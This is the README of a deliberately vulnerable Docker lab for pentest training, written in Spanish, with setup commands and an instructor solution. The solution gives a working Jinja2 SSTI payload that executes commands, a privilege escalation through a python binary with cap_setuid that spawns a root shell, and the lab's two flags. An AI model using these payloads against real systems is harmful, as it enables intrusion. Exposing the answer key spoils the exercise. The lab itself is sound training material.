# Lab EXAMEN — ejercicio de pentest en un contenedor

> **Solo para uso de entrenamiento autorizado.** Vulnerable a propósito. Escucha
> solo en `127.0.0.1`. No lo expongas a ninguna red no confiable.

Un contenedor Docker con un pequeño panel de estado en Flask. El alumno encadena:
recon HTTP → **SSTI** en Jinja2 (RCE como `app`) → escalada de privilegios por
**cap_setuid** → `root` → flag en `/root/flag.txt`.

## Servicio
| Puerto | Servicio | Rol |
|--------|----------|-----|
| 5000 | Flask (Python) | SSTI → RCE; privesc por una copia de python con capabilities |

## Ejecución
Preferí el launcher de la raíz (`../lab.sh` / `../lab.ps1`), que levanta este lab
junto con el demo. De forma independiente:
```bash
docker compose up -d --build
docker compose port lab 5000     # -> 127.0.0.1:<puerto aleatorio>
```
Reiniciar entre alumnos:
```bash
docker compose down && docker compose up -d --build
```

## Solución prevista (solo instructor)
1. **Recon** — abrí el sitio y leé el código fuente HTML. Un comentario `TODO`
   revela que el endpoint `/greet?name=` renderiza el nombre a través del motor de
   templates.
2. **SSTI → RCE** — confirmá con `?name={{7*7}}` (renderiza `Hello, 49!`). Después
   ejecutá comandos como el usuario `app`:
   ```
   /greet?name={{cycler.__init__.__globals__.os.popen('id').read()}}
   ```
   User flag: `/home/app/user.txt`. La nota de traspaso `/home/app/notes.txt`
   apunta al privesc.
3. **Privesc** — `getcap -r / 2>/dev/null` muestra que `/usr/local/bin/pythonpriv`
   tiene `cap_setuid+ep`. Cualquier usuario puede entonces setear UID 0:
   ```bash
   /usr/local/bin/pythonpriv -c 'import os;os.setuid(0);os.execl("/bin/bash","bash","-p")'
   cat /root/flag.txt
   ```

## Flags
- user: `FLAG{ssti_rce_as_app_via_jinja2}`
- root: `FLAG{root_via_cap_setuid_python_gg}`
